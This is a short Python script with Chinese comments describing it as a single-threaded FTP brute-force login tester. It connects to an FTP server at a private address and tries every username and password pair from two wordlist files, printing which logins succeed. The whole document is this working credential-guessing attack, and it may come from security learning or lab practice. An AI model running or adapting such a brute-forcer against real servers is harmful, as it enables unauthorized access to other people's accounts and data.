# -*- coding: utf-8 -*-
# coding=utf-8

# 单线程
# 简单的模拟登陆测试
# 爆破：IP，端口，用户名，密码字典
import ftplib

def ftp_brute():
    ftp = ftplib.FTP()
    ftp.connect('192.168.0.6', 21)
    for username in open('ftp-user.txt', encoding="utf-8"):
        for password in open('ftp-pass.txt', encoding="utf-8"):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            try:
                ftp.login(username, password)
                ftp.retrlines('list')
                print(username + "|" + password + "|ok")
            except ftplib.all_errors:
                print(username + "|" + password + "|no")
                pass


if __name__ == '__main__':
    ftp_brute()